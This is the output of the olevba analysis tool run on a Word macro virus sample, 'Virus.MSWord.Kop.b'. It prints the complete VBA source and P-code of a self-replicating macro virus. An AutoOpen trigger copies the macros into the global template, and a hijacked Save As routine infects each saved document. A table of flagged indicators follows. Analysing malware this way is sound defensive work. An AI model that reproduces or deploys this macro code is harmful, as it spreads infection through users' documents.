olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Kop.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Kop.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Kop.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
        WordBasic.Call "kopieren"
End Sub
-------------------------------------------------------------------------------
VBA MACRO kopieren.bas 
in file: ./Virus.MSWord.Kop.b - OLE stream: 'Macros/VBA/kopieren'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    Dim Fname$
    Dim MacName1$
    Dim MacName2$
    Dim MacName3$
    Fname$ = WordBasic.[FileName$]()
    MacName1$ = Fname$ + ":AutoOpen"
    MacName2$ = Fname$ + ":DateiSpeichernUnter"
    MacName3$ = Fname$ + ":kopieren"
    WordBasic.MacroCopy MacName1$, "Global:AutoOpen", 1
    WordBasic.MacroCopy MacName2$, "Global:DateiSpeichernUnter", 1
    WordBasic.MacroCopy MacName3$, "Global:kopieren", 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO DateiSpeichernUnter.bas 
in file: ./Virus.MSWord.Kop.b - OLE stream: 'Macros/VBA/DateiSpeichernUnter'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Dim Cnt
Dim Founded
    Dim dbox As Object: Set dbox = WordBasic.DialogRecord.FileSaveAs(False)         'define Dialog box
    WordBasic.CurValues.FileSaveAs dbox                 'initialize and run dialog box
    
    On Error GoTo -1: On Error GoTo Ende                    'Call Exception Handle "Exit"
    WordBasic.Dialog.FileSaveAs dbox
    If ((dbox.Format = 0) Or (dbox.Format = 1)) Then  'Save only Macros in                                                Files with the end                                                  *.dot, *.doc
            WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
            WordBasic.MacroCopy "Global:kopieren", WordBasic.[WindowName$]() + ":kopieren", 1
            WordBasic.MacroCopy "Global:DateiSpeichernUnter", WordBasic.[WindowName$]() + ":DateiSpeichernUnter", 1
            dbox.Format = 1                 'transform File in a                                                 template
            WordBasic.FileSaveAs dbox       'save the File
    End If
        
Ende:
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Kop.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 884 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	LitStr 0x0008 "kopieren"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #3:
' 	EndSub 
' Macros/VBA/kopieren - 1481 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Fname
' Line #3:
' 	Dim 
' 	VarDefn MacName1
' Line #4:
' 	Dim 
' 	VarDefn MacName2
' Line #5:
' 	Dim 
' 	VarDefn MacName3
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St Fname$ 
' Line #7:
' 	Ld Fname$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St MacName1$ 
' Line #8:
' 	Ld Fname$ 
' 	LitStr 0x0014 ":DateiSpeichernUnter"
' 	Add 
' 	St MacName2$ 
' Line #9:
' 	Ld Fname$ 
' 	LitStr 0x0009 ":kopieren"
' 	Add 
' 	St MacName3$ 
' Line #10:
' 	Ld MacName1$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #11:
' 	Ld MacName2$ 
' 	LitStr 0x001A "Global:DateiSpeichernUnter"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #12:
' 	Ld MacName3$ 
' 	LitStr 0x000F "Global:kopieren"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #13:
' 	EndSub 
' Macros/VBA/DateiSpeichernUnter - 2337 bytes
' Line #0:
' 	FuncDefn (Public Sub MAIN())
' Line #1:
' 	Dim 
' 	VarDefn Cnt
' Line #2:
' 	Dim 
' 	VarDefn Founded
' Line #3:
' 	Dim 
' 	VarDefn dbox (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dbox 
' 	QuoteRem 0x0054 0x0011 "define Dialog box"
' Line #4:
' 	Ld dbox 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' 	QuoteRem 0x0038 0x001D "initialize and run dialog box"
' Line #5:
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Ende 
' 	QuoteRem 0x003C 0x001C "Call Exception Handle "Exit""
' Line #7:
' 	Ld dbox 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	Ld dbox 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld dbox 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	IfBlock 
' 	QuoteRem 0x0036 0x0093 "Save only Macros in                                                Files with the end                                                  *.dot, *.doc"
' Line #9:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #10:
' 	LitStr 0x000F "Global:kopieren"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":kopieren"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #11:
' 	LitStr 0x001A "Global:DateiSpeichernUnter"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0014 ":DateiSpeichernUnter"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld dbox 
' 	MemSt Format$ 
' 	QuoteRem 0x002C 0x004C "transform File in a                                                 template"
' Line #13:
' 	Ld dbox 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' 	QuoteRem 0x002C 0x000D "save the File"
' Line #14:
' 	EndIfBlock 
' Line #15:
' Line #16:
' 	Label Ende 
' Line #17:
' 	EndSub 
' Line #18:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

